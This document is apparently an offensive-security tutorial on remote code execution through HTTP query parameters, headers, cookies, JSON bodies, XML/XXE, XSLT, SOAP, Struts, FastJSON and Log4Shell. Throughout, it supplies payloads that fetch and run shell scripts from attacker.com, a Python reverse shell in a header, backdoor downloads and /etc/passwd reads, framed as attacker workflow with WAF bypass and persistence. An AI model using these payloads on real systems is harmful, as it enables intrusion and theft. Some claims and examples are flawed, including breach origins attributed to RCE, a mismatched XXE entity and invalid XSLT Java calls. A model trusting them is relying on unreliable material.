# Offensive Security RCE Field Manual — Part 1
## HTTP, JSON & XML RCE (2025 Edition)
*A deep-dive into modern Remote Code Execution attack surfaces, delivery methods, real-world attacker workflow, and offensive security tradecraft.*

---

# Table of Contents
1. [Introduction](#introduction)  
   - [1.1 Why RCE Matters in 2025](#11-why-rce-matters-in-2025)  
   - [1.2 Modern Attacker Mindset](#12-modern-attacker-mindset)  
   - [1.3 Tools Used in Real-World RCE Operations](#13-tools-used-in-real-world-rce-operations)

2. [HTTP-Based RCE](#2-http-based-rce)  
   - [2.1 Query Parameter Injection](#21-query-parameter-injection)  
   - [2.2 Header Injection](#22-header-injection)  
   - [2.3 Cookie Injection & Insecure Deserialization](#23-cookie-injection--insecure-deserialization)

3. [JSON API RCE](#3-json-api-rce)  
   - [3.1 Direct JSON Property Injection](#31-direct-json-property-injection)  
   - [3.2 Nested Object Injection](#32-nested-object-injection)  
   - [3.3 Array Injection](#33-array-injection)

4. [XML-Based RCE](#4-xml-based-rce)  
   - [4.1 XXE → RCE](#41-xxe--rce)  
   - [4.2 XSLT Transformation RCE](#42-xslt-transformation-rce)  
   - [4.3 SOAP API Injection](#43-soap-api-injection)

5. [Real-World RCE Case Studies](#5-real-world-rce-case-studies)  
   - [5.1 Apache Struts OGNL](#51-apache-struts-ognl)  
   - [5.2 FastJSON Deserialization](#52-fastjson-deserialization)  
   - [5.3 Log4Shell](#53-log4shell)

6. [Why APIs Are Highly Vulnerable to RCE](#6-why-apis-are-highly-vulnerable-to-rce)

---

# Introduction

Remote Code Execution (RCE) remains the most strategically valuable vulnerability class in modern offensive security. As cloud-native stacks, distributed systems, and API-centric applications evolve, RCE has moved beyond simple user-input concatenation and now frequently emerges from:

- JSON pipelines  
- XML parsers  
- templating engines  
- deserialization  
- chained business-logic flows  
- cloud metadata SSRF pivots  
- internal service bridging  
- request smuggling  
- HTTP/2 inconsistencies  

RCE in 2025 is rarely a single injection—it's an **execution chain** created by layered assumptions, trust boundaries, and flawed data flows.

This module teaches **how attackers actually achieve RCE**, the **delivery methods**, and the **underlying logic that makes these flaws exploitable**.

---

# 1.1 Why RCE Matters in 2025

From a threat intelligence and offensive operations perspective, RCE allows an attacker to:

- execute arbitrary OS commands  
- drop implants, loaders, and RATs  
- steal credentials (files, env vars, tokens, IAM metadata)  
- perform internal network reconnaissance  
- pivot into cloud workloads  
- compromise supply-chain systems  

Recent global breaches (SolarWinds, 3CX, JetBrains 2025) all began with RCE.

RCE = **full control of the application context**.

---

# 1.2 Modern Attacker Mindset

Attackers no longer search for a single bug—they search for **execution paths**.

Their workflow:

### **1. Recon**
Identify HTTP entry points:
- query params  
- JSON bodies  
- XML/SOAP  
- GraphQL  
- hidden admin endpoints  
- undocumented API endpoints  

### **2. Probe**
Send harmless “jabs”:
```
;id
|whoami
${7*7}
{{7*7}}
`
```

These reveal:
- template engines  
- backend languages  
- parsing inconsistencies  
- injection feasibility  

### **3. Context Discovery**
Identify stack: Java vs PHP vs NodeJS vs Python vs .NET.  
Each has unique vulnerabilities.

### **4. Payload Delivery**
Use encoding, escaping, and smuggling to bypass WAFs.  
Deliver remote loaders:

```
curl http://attacker.com/shell.sh | sh
```

### **5. Execution & Persistence**
Establish shell access → drop persistence → escalate privileges.

### **6. Lateral Movement**
Pivot from compromised service into:
- databases  
- internal APIs  
- CI/CD  
- container clusters  
- cloud metadata services  

RCE is never the end—it's the beginning.

---

# 1.3 Tools Used in Real-World RCE Operations

### **Burp Suite**
Offensive operators use Burp Suite for:
- manipulating parameters  
- editing JSON/XML  
- inserting smuggled headers  
- multi-encoding payloads  
- testing WAFs  
- fuzzing APIs with Intruder  
- issuing HTTP/2 requests  
- tracking backend behavior  

### **curl / wget**
For payload delivery:
```
curl http://attacker/payload.sh | bash
```

### **Python (requests)**
Used for exploiting APIs repeatedly or building custom POCs:
```python
import requests
```

### **Postman**
Ideal for:
- GraphQL  
- SOAP  
- deeply nested JSON  
- multi-step APIs  

---

# 2. HTTP-Based RCE

HTTP is the most heavily attacked RCE surface. Most RCE stems from:

- unsafe shell commands  
- flawed input handling  
- template evaluation  
- logging systems executing input  
- WAF bypasses  
- poor encoding handling  
- header trust  

---

# 2.1 Query Parameter Injection

### What It Is  
When URL parameters are concatenated into shell commands or used in unsafe contexts.

### Example Attack Payload

```http
GET /api/search?query=test;curl${IFS}http://attacker.com/shell.sh${IFS}|${IFS}sh HTTP/1.1
Host: vulnerable-app.com
```

### Why It Works
- `;` terminates current command, executes next  
- `${IFS}` bypasses filters blocking spaces  
- Backend directly inserts parameter into shell  

### Real Attack Chains
Used in:
- IoT devices  
- CMS search endpoints  
- Admin panels  
- Log processors  

Attackers escalate from:
1. `;id`  
2. `;cat /etc/passwd`  
3. Remote loader  
4. Shell control  

---

# 2.2 Header Injection

Headers commonly abused:
- X-Forwarded-For  
- User-Agent  
- X-Real-IP  
- X-API-Version  
- Referer  

### Example Attack Payload

```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Why It Works
- Apps trust header content  
- Logging systems evaluate or template headers  
- Pre-Log4Shell frameworks used expansion by default  

### Offensive Notes
Headers are perfect for:
- bypassing IP restrictions  
- triggering log-based RCE  
- injecting payloads where input filtering is stricter in params  

---

# 2.3 Cookie Injection & Insecure Deserialization

### Example Attack

```http
Cookie: user_prefs={"theme":"dark","language":"en_US\");os.system(\"wget http://attacker.com/bd.sh -O /tmp/bd.sh\");//"}
```

### Why It Works
- Cookie data is decoded and deserialized  
- If signing is missing or weak → full attacker control  
- Many frameworks auto-deserialize  

### Common Targets
- PHP: `unserialize()`  
- Python: pickle deserialization  
- Ruby: Marshal  
- Java: readObject() / unsafe JSON parsers  

---

# 3. JSON API RCE

JSON is the default API format for mobile & web apps.  
Vulnerabilities arise when:

- JSON is inserted into templates  
- JSON values enter shell commands  
- JSON is deserialized into objects  
- JSON merges into internal contexts  

---

# 3.1 Direct JSON Property Injection

### Example Payload

```json
{
  "username": "admin",
  "email": "admin@test.com\"});__import__('os').system('curl http://attacker.com/exploit.sh | bash');//",
  "role": "user"
}
```

### Why It Works
- Breaks out of JSON string context  
- Executes Python/Java/Node commands  
- Occurs when JSON values are:
  - evaluated  
  - inserted into code  
  - processed in templates  

### Real OffSec Example
NodeJS apps often embed JSON values into templates → enabling SSTI-style execution.

---

# 3.2 Nested Object Injection

### Example Payload

```json
{
  "user": {
    "profile": {
      "settings": {
        "preferences": "${T(java.lang.Runtime).getRuntime().exec('calc.exe')}",
        "layout": "#{7*7}"
      }
    }
  }
}
```

### Why It Works
Deeply nested JSON bypasses shallow validation.

### Common Targets
- Spring (Java)  
- Thymeleaf  
- Freemarker  
- Jinja2  

---

# 3.3 Array Injection

### Example Payload

```json
{
  "filters": [
    "status=active",
    "user=admin; curl http://attacker.com/shell.sh | bash;",
    "${@java.lang.Runtime@getRuntime().exec('wget http://attacker.com/backdoor')}",
    "{{config.__class__.__init__.__globals__['os'].system('id')}}"
  ]
}
```

### Why It Works
- Arrays are blindly iterated  
- Each value is inserted into logic  
- Attackers abuse arrays for:
  - shell injection  
  - template injection  
  - deserialization  

---

# 4. XML-Based RCE

XML vulnerabilities arise from:
- XXE  
- remote DTDs  
- XSLT processing  
- XML deserialization  
- SOAP object parsing  

---

# 4.1 XXE → RCE

### Example XML

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd">
%ext;
]>
<root>&rce;</root>
```

### evil.dtd

```xml
<!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param "<!ENTITY &#x25; rce SYSTEM 'expect://id'>">
%param;
```

### Why It Works
- External DTDs loaded remotely  
- PHP's `expect://` executes shell commands  
- XML parser expands entities  

---

# 4.2 XSLT Transformation RCE

### Example

```xml
<xsl:stylesheet version="1.0">
  <xsl:template match="/">
    <xsl:copy-of select="document('http://attacker.com/execute?cmd=whoami')"/>
    <xsl:value-of select="java.lang.Runtime.getRuntime().exec('calc.exe')"/>
  </xsl:template>
</xsl:stylesheet>
```

### Why It Works
- XSLT engines allow extension functions  
- Some expose Java runtime directly  

---

# 4.3 SOAP API Injection

### Example

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/">
  <soap:Body>
    <getUserInfo>
      <userId>1|cat /etc/passwd</userId>
      <format>json#{T(java.lang.Runtime).getRuntime().exec('wget http://attacker.com/backdoor')}</format>
    </getUserInfo>
  </soap:Body>
</soap:Envelope>
```

### Why It Works
- SOAP servers deserialize XML directly into objects  
- Many legacy stacks use Groovy/Java with unsafe evaluation  

---

# 5. Real-World RCE Case Studies

---

# 5.1 Apache Struts OGNL

```http
POST /struts2-showcase/fileupload/doUpload.action HTTP/1.1
Content-Type: %{(#_='multipart/form-data').(...snipped...)}
```

### Impact
Led to the Equifax breach—one of the most devastating RCE exploits in history.

---

# 5.2 FastJSON Deserialization

```json
{
  "@type": "org.apache.ibatis.scripting.xmltags.OgnlCache",
  "node": {
    "@type": "org.apache.ibatis.scripting.xmltags.StaticTextSqlNode",
    "text": "${@java.lang.Runtime@getRuntime().exec('curl http://attacker.com/exploit.sh | bash')}"
  }
}
```

### Why It Works
FastJSON auto-instantiates attacker-specified classes.  
This remains actively exploited in 2025.

---

# 5.3 Log4Shell (CVE-2021-44228)

```http
GET /?search=${jndi:ldap://attacker.com/a} HTTP/1.1
User-Agent: ${jndi:ldap://malicious.com/exploit}
```

### Execution Chain
1. Log4j logs attacker-controlled input  
2. JNDI resolves remote LDAP address  
3. Malicious Java bytecode returned  
4. Executed with application privileges  

---

# 6. Why APIs Are Highly Vulnerable to RCE

### Key Reasons
- JSON/XML are deeply trusted  
- API gateways rarely inspect body content  
- Internal services trust each other  
- Template engines process attacker input  
- Microservices share objects and contexts  
- Validation often shallow or schema-based  
- Deserializers auto-load attacker payloads  

### Modern Combined Attack Chain Example (2025)
1. Attacker sends malicious JSON  
2. API Gateway passes it (no deep inspection)  
3. Microservice merges JSON with internal template variables  
4. Template engine executes expression  
5. RCE achieved  
6. Attacker pivots into internal cloud workload  

---

# END OF PART 1
